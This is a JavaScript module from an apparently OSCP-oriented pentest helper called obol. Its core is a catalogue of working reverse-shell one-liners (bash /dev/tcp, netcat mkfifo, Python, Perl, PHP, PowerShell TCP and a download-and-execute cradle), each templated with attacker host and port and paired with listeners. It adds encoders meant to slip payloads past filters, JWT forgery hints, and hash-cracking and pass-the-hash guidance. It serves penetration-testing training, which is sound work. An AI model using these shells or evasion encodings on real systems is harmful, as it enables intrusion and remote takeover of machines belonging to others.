/*!
 * obol engine, workbench.js
 * Pure, dependency-free logic for the Workbench: the "borrowed back ends" that obol runs entirely
 * client-side. No network, no execution, no state of its own. Everything here is a plain function or
 * a data table so it can be unit-tested under node and reused by the route UI.
 *
 * What lives here:
 *   - REVSHELLS: a curated reverse-shell catalogue (the common OSCP set), each a {{lhost}}/{{lport}}
 *     template with a plain-language note and a matching listener.
 *   - Encoders: UTF-8 base64, URL, hex, ROT13, and the OSCP favourite PowerShell -EncodedCommand
 *     (UTF-16LE then base64), plus a Linux "pipe to base64 -d" runner wrapper.
 * These ENRICH presentation only. They never touch the pack commands, the fact ledger, or the coach.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var W = {};

  // ── byte / base64 primitives (work identically in the browser and in node) ──────────────────
  var B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

  function bytesToB64(bytes) {
    var out = '', i;
    for (i = 0; i + 2 < bytes.length; i += 3) {
      var n = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2];
      out += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + B64[(n >> 6) & 63] + B64[n & 63];
    }
    var rem = bytes.length - i;
    if (rem === 1) { var a = bytes[i] << 16; out += B64[(a >> 18) & 63] + B64[(a >> 12) & 63] + '=='; }
    else if (rem === 2) { var b = (bytes[i] << 16) | (bytes[i + 1] << 8); out += B64[(b >> 18) & 63] + B64[(b >> 12) & 63] + B64[(b >> 6) & 63] + '='; }
    return out;
  }

  // String → UTF-8 byte array (handles surrogate pairs).
  function utf8Bytes(str) {
    str = String(str == null ? '' : str);
    var out = [];
    for (var i = 0; i < str.length; i++) {
      var c = str.charCodeAt(i);
      if (c < 0x80) { out.push(c); }
      else if (c < 0x800) { out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
      else if (c >= 0xd800 && c < 0xdc00 && i + 1 < str.length) {
        var c2 = str.charCodeAt(++i);
        var u = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
        out.push(0xf0 | (u >> 18), 0x80 | ((u >> 12) & 0x3f), 0x80 | ((u >> 6) & 0x3f), 0x80 | (u & 0x3f));
      } else { out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f)); }
    }
    return out;
  }

  // String → UTF-16LE byte array (what PowerShell -EncodedCommand expects).
  function utf16leBytes(str) {
    str = String(str == null ? '' : str);
    var out = [];
    for (var i = 0; i < str.length; i++) { var c = str.charCodeAt(i); out.push(c & 0xff, (c >> 8) & 0xff); }
    return out;
  }

  // ── encoders ────────────────────────────────────────────────────────────────────────────────
  W.b64 = function (str) { return bytesToB64(utf8Bytes(str)); };

  W.b64decode = function (b64) {
    b64 = String(b64 == null ? '' : b64).replace(/\s+/g, '');
    var bytes = [], buf = 0, bits = 0;
    for (var i = 0; i < b64.length; i++) {
      var ch = b64[i]; if (ch === '=') break;
      var v = B64.indexOf(ch); if (v < 0) continue;
      buf = (buf << 6) | v; bits += 6;
      if (bits >= 8) { bits -= 8; bytes.push((buf >> bits) & 0xff); }
    }
    // decode UTF-8 bytes back to a string
    var out = '', j = 0;
    while (j < bytes.length) {
      var b = bytes[j++];
      if (b < 0x80) { out += String.fromCharCode(b); }
      else if (b >= 0xc0 && b < 0xe0) { out += String.fromCharCode(((b & 0x1f) << 6) | (bytes[j++] & 0x3f)); }
      else if (b >= 0xe0 && b < 0xf0) { out += String.fromCharCode(((b & 0x0f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f)); }
      else { var u = ((b & 0x07) << 18) | ((bytes[j++] & 0x3f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f); u -= 0x10000; out += String.fromCharCode(0xd800 + (u >> 10), 0xdc00 + (u & 0x3ff)); }
    }
    return out;
  };

  // PowerShell -EncodedCommand payload: base64 of the UTF-16LE script bytes. OffSec teaches this to
  // sidestep quoting and bad characters on the command line.
  W.psEnc = function (script) { return bytesToB64(utf16leBytes(script)); };

  W.hexDecode = function (hex) {
    hex = String(hex == null ? '' : hex).replace(/\s+/g, '');
    if (!/^[0-9a-fA-F]*$/.test(hex) || hex.length % 2 !== 0) return null;
    var bytes = [];
    for (var i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.substr(i, 2), 16));
    var out = '', j = 0;
    while (j < bytes.length) {
      var b = bytes[j++];
      if (b < 0x80) out += String.fromCharCode(b);
      else if (b >= 0xc0 && b < 0xe0) out += String.fromCharCode(((b & 0x1f) << 6) | (bytes[j++] & 0x3f));
      else if (b >= 0xe0 && b < 0xf0) out += String.fromCharCode(((b & 0x0f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f));
      else { var u = ((b & 0x07) << 18) | ((bytes[j++] & 0x3f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f); u -= 0x10000; out += String.fromCharCode(0xd800 + (u >> 10), 0xdc00 + (u & 0x3ff)); }
    }
    return out;
  };
  W.urlDecode = function (str) { try { return decodeURIComponent(String(str == null ? '' : str).replace(/\+/g, ' ')); } catch (e) { return null; } };
  W.urlEnc = function (str) { return encodeURIComponent(String(str == null ? '' : str)); };
  W.urlEncAll = function (str) {
    // Encode EVERY byte (%NN), the aggressive form useful when a filter blocks specific characters.
    return utf8Bytes(str).map(function (b) { return '%' + ('0' + b.toString(16)).slice(-2).toUpperCase(); }).join('');
  };
  W.hexEnc = function (str) { return utf8Bytes(str).map(function (b) { return ('0' + b.toString(16)).slice(-2); }).join(''); };
  W.rot13 = function (str) {
    return String(str == null ? '' : str).replace(/[a-zA-Z]/g, function (c) {
      var base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base);
    });
  };
  // ${IFS} whitespace evasion: replace spaces with ${IFS} so a space-filtering filter still runs the
  // command. A teaching aid, shown beside a plain-language note about when it helps.
  W.ifsEvade = function (str) { return String(str == null ? '' : str).replace(/ /g, '${IFS}'); };

  // base64url (JWT) decode: the URL-safe alphabet, no padding.
  W.b64urlDecode = function (s) {
    s = String(s == null ? '' : s).replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return W.b64decode(s);
  };

  // Decode (not verify) a JWT. Verification needs the secret/key, which obol never has; this is a reader,
  // and that distinction is the teaching point: a decoded token is not a trusted token.
  W.decodeJwt = function (token) {
    token = String(token == null ? '' : token).trim();
    var parts = token.split('.');
    if (parts.length < 2) return { ok: false, error: 'Not a JWT. A JWT has three parts separated by dots: header.payload.signature.' };
    function parseSeg(seg, which) {
      try { return { ok: true, obj: JSON.parse(W.b64urlDecode(seg)) }; }
      catch (e) { return { ok: false, error: 'The ' + which + ' is not valid base64url JSON.' }; }
    }
    var h = parseSeg(parts[0], 'header'), p = parseSeg(parts[1], 'payload');
    if (!h.ok) return { ok: false, error: h.error };
    if (!p.ok) return { ok: false, error: p.error };
    var alg = h.obj && h.obj.alg;
    var flags = [];
    if (alg && String(alg).toLowerCase() === 'none') flags.push('alg is "none": if the server honours it, the signature is not checked at all. Try sending the token with an empty signature.');
    if (alg && /^hs/i.test(String(alg))) flags.push('alg is HMAC (' + alg + '): the signature uses a shared secret. If that secret is weak, it can be brute-forced offline (hashcat -m 16500), then you can forge any token.');
    if (alg && /^rs/i.test(String(alg))) flags.push('alg is RSA (' + alg + '): signed with a private key. Watch for an algorithm-confusion trick (RS256 to HS256 using the public key as the HMAC secret).');
    return {
      ok: true, header: h.obj, payload: p.obj, signature: parts[2] || '', alg: alg || null,
      flags: flags, hasSig: !!(parts[2] && parts[2].length),
    };
  };

  // A Linux one-liner that decodes and runs a base64 payload. OffSec teaches base64-wrapping a reverse
  // shell so a tricky character set (quotes, &, redirects) survives being pasted into a target field.
  W.linuxB64Runner = function (cmd, shellBin) {
    shellBin = shellBin || 'bash';
    return 'echo ' + W.b64(cmd) + ' | base64 -d | ' + shellBin;
  };

  // ── reverse-shell catalogue ─────────────────────────────────────────────────────────────────
  // Templates use {{lhost}} and {{lport}}. `os` groups them for the UI. `enc` flags which encodings
  // make sense to offer for that payload (b64 for Linux shells, psenc for PowerShell). The note is for
  // a learner: when this one works and what to watch for.
  W.REVSHELLS = [
    {
      id: 'bash-i', name: 'Bash -i', os: 'linux', enc: ['b64'],
      tpl: 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',
      note: 'The classic. Needs a real bash (not dash). If it hangs with no connection, the box may not have /dev/tcp, so try the mkfifo or Python form.',
    },
    {
      id: 'bash-196', name: 'Bash 196 (read line)', os: 'linux', enc: ['b64'],
      tpl: '0<&196;exec 196<>/dev/tcp/{{lhost}}/{{lport}}; sh <&196 >&196 2>&196',
      note: 'An alternate /dev/tcp form that sometimes works when "bash -i" does not.',
    },
    {
      id: 'sh-tcp', name: 'sh (/dev/tcp)', os: 'linux', enc: ['b64'],
      tpl: 'sh -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',
      note: 'For boxes whose default shell is dash/sh. Same idea as bash -i.',
    },
    {
      id: 'nc-mkfifo', name: 'nc (mkfifo)', os: 'linux', enc: ['b64'],
      tpl: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f',
      note: 'Portable: works with the stripped nc that has no -e. The go-to when the box has netcat but /dev/tcp is missing.',
    },
    {
      id: 'nc-e', name: 'nc -e', os: 'linux', enc: ['b64'],
      tpl: 'nc {{lhost}} {{lport}} -e /bin/sh',
      note: 'Only works if netcat was built with -e (the "traditional" nc). Many modern boxes strip it, so keep mkfifo ready.',
    },
    {
      id: 'ncat-ssl', name: 'ncat (TLS)', os: 'linux', enc: ['b64'],
      tpl: 'ncat --ssl {{lhost}} {{lport}} -e /bin/bash',
      note: 'Encrypted shell with ncat on both ends. Start the listener with: ncat --ssl -lvnp {{lport}}.',
    },
    {
      id: 'python3', name: 'Python 3', os: 'linux', enc: ['b64'],
      tpl: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
      note: 'Very reliable on Linux and gives you a PTY straight away (less need for the manual upgrade). Try python2/python if python3 is absent.',
    },
    {
      id: 'php', name: 'PHP', os: 'linux', enc: ['b64'],
      tpl: 'php -r \'$sock=fsockopen("{{lhost}}",{{lport}});exec("/bin/sh -i <&3 >&3 2>&3");\'',
      note: 'For a box with PHP on the path (web servers). If exec is disabled, try the system/passthru variants.',
    },
    {
      id: 'perl', name: 'Perl', os: 'linux', enc: ['b64'],
      tpl: 'perl -e \'use Socket;$i="{{lhost}}";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
      note: 'Perl is on almost every Linux box. A dependable fallback when bash and python are awkward.',
    },
    {
      id: 'ruby', name: 'Ruby', os: 'linux', enc: ['b64'],
      tpl: 'ruby -rsocket -e\'f=TCPSocket.open("{{lhost}}",{{lport}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
      note: 'For boxes with Ruby (rails apps, some appliances).',
    },
    {
      id: 'socat', name: 'socat (PTY)', os: 'linux', enc: ['b64'],
      tpl: 'socat TCP:{{lhost}}:{{lport}} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane',
      note: 'The nicest Linux shell if socat is present on BOTH ends. Listener: socat file:`tty`,raw,echo=0 TCP-LISTEN:{{lport}}.',
    },
    {
      id: 'awk', name: 'awk', os: 'linux', enc: ['b64'],
      tpl: 'awk \'BEGIN {s = "/inet/tcp/0/{{lhost}}/{{lport}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
      note: 'A last-resort shell on a minimal box that still has awk. Simple line-based, no job control.',
    },
    {
      id: 'ps-tcp', name: 'PowerShell (TCP)', os: 'windows', enc: ['psenc'],
      tpl: '$client = New-Object System.Net.Sockets.TCPClient("{{lhost}}",{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
      note: 'The standard Windows one-liner. Use the Base64 (-EncodedCommand) toggle so quoting and bad characters cannot break it, which is exactly how OffSec teaches it for the OSCP.',
    },
    {
      id: 'ps-iex-download', name: 'PowerShell (download + IEX)', os: 'windows', enc: ['psenc'],
      tpl: 'IEX(New-Object Net.WebClient).DownloadString("http://{{lhost}}:{{lport}}/shell.ps1")',
      note: 'Fetches and runs a script you serve from Kali. Pair with a web server (python3 -m http.server {{lport}}) and your own shell.ps1, not a reverse-shell listener.',
    },
    {
      id: 'cmd-nc', name: 'Windows nc.exe', os: 'windows', enc: [],
      tpl: 'nc.exe {{lhost}} {{lport}} -e cmd.exe',
      note: 'Needs nc.exe staged on the target first (serve it from Kali, download it, then run). A plain cmd shell, no PowerShell.',
    },
  ];

  // ── hash identifier ─────────────────────────────────────────────────────────────────────────
  // Deterministic, rule-based (like hashid / name-that-hash), so it stays exam-legal: no guessing
  // model, just structure. Each rule yields {name, mode (hashcat -m, or null), john, note}. Structured
  // prefixes are unambiguous; bare hex is ranked by OSCP-likelihood with the alternatives shown, because
  // a 32-char hex string is genuinely NTLM or MD5 and only context tells which.
  function hc(name, mode, john, note) { return { name: name, mode: mode, john: john, note: note || '' }; }

  var HASH_PREFIX_RULES = [
    { re: /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/, c: [hc('bcrypt', 3200, 'bcrypt', 'Slow by design. CrackStation will not help, crack offline with a good wordlist and patience.')] },
    { re: /^\$6\$/, c: [hc('sha512crypt (Linux /etc/shadow)', 1800, 'sha512crypt', 'A Linux shadow hash. Slow. Offline wordlist crack only.')] },
    { re: /^\$5\$/, c: [hc('sha256crypt (Linux /etc/shadow)', 7400, 'sha256crypt', 'A Linux shadow hash. Slow. Offline wordlist crack only.')] },
    { re: /^\$1\$/, c: [hc('md5crypt (Linux /etc/shadow)', 500, 'md5crypt', 'Old Linux shadow hash. Slow, salted. Offline crack.')] },
    { re: /^\$apr1\$/, c: [hc('Apache md5apr1 (.htpasswd)', 1600, 'md5crypt', 'Apache htpasswd MD5. Salted. Offline crack.')] },
    { re: /^\$(P|H)\$/, c: [hc('phpass (WordPress / phpBB / Joomla)', 400, 'phpass', 'The CMS hash family. Salted and stretched. Offline crack.')] },
    { re: /^\{SSHA\}/, c: [hc('LDAP {SSHA} (salted SHA-1)', 111, 'ssha', 'Common in LDAP directories. Salted.')] },
    { re: /^\{SHA\}/, c: [hc('LDAP {SHA} (base64 SHA-1)', 101, 'nsldap', 'Unsalted base64 SHA-1. CrackStation may know it.')] },
    { re: /^\$krb5asrep\$(23)\$/i, c: [hc('Kerberos AS-REP (RC4)', 18200, 'krb5asrep', 'From AS-REP roasting (a user with "do not require preauth"). RC4, fast to crack. Try a wordlist first.')] },
    { re: /^\$krb5asrep\$(17|18)\$/i, c: [hc('Kerberos AS-REP (AES)', 18200, 'krb5asrep', 'AES variant of AS-REP roast. Slower than RC4. Offline wordlist crack.')] },
    { re: /^\$krb5tgs\$23\$/i, c: [hc('Kerberoast TGS-REP (RC4)', 13100, 'krb5tgs', 'From Kerberoasting a service account. RC4, fast. Service accounts often have weak passwords, so this is high value.')] },
    { re: /^\$krb5tgs\$17\$/i, c: [hc('Kerberoast TGS-REP (AES128)', 19600, 'krb5tgs', 'AES128 Kerberoast. Slower than RC4. Offline wordlist crack.')] },
    { re: /^\$krb5tgs\$18\$/i, c: [hc('Kerberoast TGS-REP (AES256)', 19700, 'krb5tgs', 'AES256 Kerberoast. Slower than RC4. Offline wordlist crack.')] },
    { re: /^\$DCC2\$/i, c: [hc('Domain Cached Credentials 2 (mscash2)', 2100, 'mscash2', 'Cached domain logon from a workstation. Very slow. Low iteration wordlist only.')] },
    { re: /^\$krb5pa\$/i, c: [hc('Kerberos pre-auth (PA-ENC-TIMESTAMP)', 7500, 'krb5pa-md5', 'From sniffed pre-auth. RC4, fast.')] },
    { re: /^0x0100[0-9a-f]+$/i, c: [hc('MSSQL 2000', 131, 'mssql', 'Legacy SQL Server hash.')] },
    { re: /^0x0200[0-9a-f]+$/i, c: [hc('MSSQL 2012 / 2014+', 1731, 'mssql12', 'Modern SQL Server hash (SHA-512 based).')] },
    { re: /^\*[A-F0-9]{40}$/i, c: [hc('MySQL 4.1+ (SHA1(SHA1(pw)))', 300, 'mysql-sha1', 'The leading * marks it. Unsalted, fast.')] },
    { re: /^[^:\s]+::[^:]*:[0-9a-f]{16}:[0-9a-f]{32}:[0-9a-f]+$/i, c: [hc('NetNTLMv2 (Responder / relay capture)', 5600, 'netntlmv2', 'Captured off the wire by Responder or an SMB relay. Crack it offline, or relay it live instead.')] },
    { re: /^[^:\s]+::[^:]*:[0-9a-f]{48}:[0-9a-f]{48}:[0-9a-f]{16}$/i, c: [hc('NetNTLMv1 (Responder capture)', 5500, 'netntlm', 'The v1 capture. Can sometimes be cracked to NTLM via rainbow tables (crack.sh).')] },
    { re: /^\$argon2[id]{1,2}\$/i, c: [hc('Argon2', null, 'argon2', 'Modern, memory-hard. hashcat has no stable mode; use john --format=argon2. Expect it to be slow.')] },
    { re: /^\$y\$/, c: [hc('yescrypt (modern Linux /etc/shadow)', null, 'crypt', 'Default on recent Debian/Ubuntu. hashcat has no mode yet; use john. Very slow.')] },
  ];

  // pwdump / secretsdump line: user:rid:LM:NT:::  → identify the NT (and flag the LM if not blank).
  var PWDUMP_RE = /^[^:\s]+:\d+:([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::\s*$/;
  var LM_EMPTY = 'aad3b435b51404eeaad3b435b51404ee';

  function hexCandidates(len) {
    switch (len) {
      case 16: return [hc('MySQL < 4.1 (MySQL323)', 200, 'mysql', 'Very old MySQL. Unsalted.'), hc('Half-LM / DES fragment', 3000, 'lm', 'Could be half of an LM hash.')];
      case 32: return [hc('NTLM (Windows account hash)', 1000, 'nt', 'If it came from a Windows / AD dump, this is almost certainly NTLM. Unsalted and fast, and usable directly in pass-the-hash without cracking.'), hc('MD5', 0, 'raw-md5', 'If it came from a web app or database, MD5 is likely. Unsalted, so CrackStation may already know it.'), hc('MD4', 900, 'raw-md4', 'Less common.')];
      case 40: return [hc('SHA-1', 100, 'raw-sha1', 'Unsalted. CrackStation may know it. Check for a leading * (that would make it MySQL).')];
      case 56: return [hc('SHA-224', 1300, 'raw-sha224', 'Unsalted.')];
      case 64: return [hc('SHA-256', 1400, 'raw-sha256', 'Unsalted. CrackStation may know it.'), hc('SHA3-256 / Keccak-256', 17400, 'raw-keccak', 'Less common.')];
      case 96: return [hc('SHA-384', 10800, 'raw-sha384', 'Unsalted.')];
      case 128: return [hc('SHA-512', 1700, 'raw-sha512', 'Unsalted. CrackStation may know it.'), hc('Whirlpool', 6100, 'whirlpool', 'Less common.')];
      default: return [];
    }
  }

  // Identify a single hash string. Returns {input, candidates:[...], lm?:bool, note?}.
  W.identifyHash = function (raw) {
    var s = String(raw == null ? '' : raw).trim();
    if (!s) return { input: '', candidates: [] };

    var pd = s.match(PWDUMP_RE);
    if (pd) {
      var out = { input: s, candidates: [hc('NTLM (from a pwdump / secretsdump line)', 1000, 'nt', 'The 4th field is the NT hash. Use it directly for pass-the-hash, or crack it. Feed just the 32-hex NT hash to hashcat.')], nt: pd[2].toLowerCase() };
      if (pd[1].toLowerCase() !== LM_EMPTY) out.candidates.push(hc('LM (the 3rd field is set)', 3000, 'lm', 'The LM half is present (not the empty AAD3B4... value). LM is weak and worth cracking fast.'));
      return out;
    }

    for (var i = 0; i < HASH_PREFIX_RULES.length; i++) {
      if (HASH_PREFIX_RULES[i].re.test(s)) return { input: s, candidates: HASH_PREFIX_RULES[i].c.slice() };
    }

    if (/^[0-9a-fA-F]+$/.test(s)) {
      var cands = hexCandidates(s.length);
      if (cands.length) return { input: s, candidates: cands };
      return { input: s, candidates: [], note: 'A ' + s.length + '-character hex string that does not match a common length. Paste it into the hashcat example-hashes wiki to compare.' };
    }
    return { input: s, candidates: [], note: 'No confident match. Compare it against the hashcat example-hashes wiki, or try name-that-hash locally.' };
  };

  // The hashcat crack command for a candidate (canonical rockyou path; the Loadout rewrite can retarget it).
  W.hashcatCmd = function (mode, hashfile, wordlist) {
    if (mode == null) return null;
    hashfile = hashfile || 'hash.txt';
    wordlist = wordlist || '/usr/share/wordlists/rockyou.txt';
    return 'hashcat -m ' + mode + ' ' + hashfile + ' ' + wordlist;
  };
  W.johnCmd = function (format, hashfile, wordlist) {
    if (!format) return null;
    hashfile = hashfile || 'hash.txt';
    wordlist = wordlist || '/usr/share/wordlists/rockyou.txt';
    return 'john --format=' + format + ' --wordlist=' + wordlist + ' ' + hashfile;
  };

  W.revShell = function (id) {
    for (var i = 0; i < W.REVSHELLS.length; i++) if (W.REVSHELLS[i].id === id) return W.REVSHELLS[i];
    return null;
  };

  // Substitute {{lhost}}/{{lport}} in a template. Missing values stay visible as the token so the gap
  // is obvious rather than silently producing a broken command.
  W.fill = function (tpl, vals) {
    vals = vals || {};
    var lhost = (vals.lhost != null && vals.lhost !== '') ? vals.lhost : '{{lhost}}';
    var lport = (vals.lport != null && vals.lport !== '') ? vals.lport : '{{lport}}';
    return String(tpl == null ? '' : tpl).split('{{lhost}}').join(lhost).split('{{lport}}').join(lport);
  };

  // The listener that catches a given reverse shell. ncat/socat carry their own above; everything else
  // is a plain netcat listener on the chosen port.
  W.listenerFor = function (entry, vals) {
    var lport = (vals && vals.lport != null && vals.lport !== '') ? vals.lport : '{{lport}}';
    if (!entry) return 'nc -lvnp ' + lport;
    if (entry.id === 'ncat-ssl') return 'ncat --ssl -lvnp ' + lport;
    if (entry.id === 'socat') return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + lport;
    if (entry.id === 'ps-iex-download') return 'python3 -m http.server ' + lport + '    # serve shell.ps1 from here';
    return 'nc -lvnp ' + lport;
  };

  OBOL.workbench = W;
})(typeof globalThis !== 'undefined' ? globalThis : this);
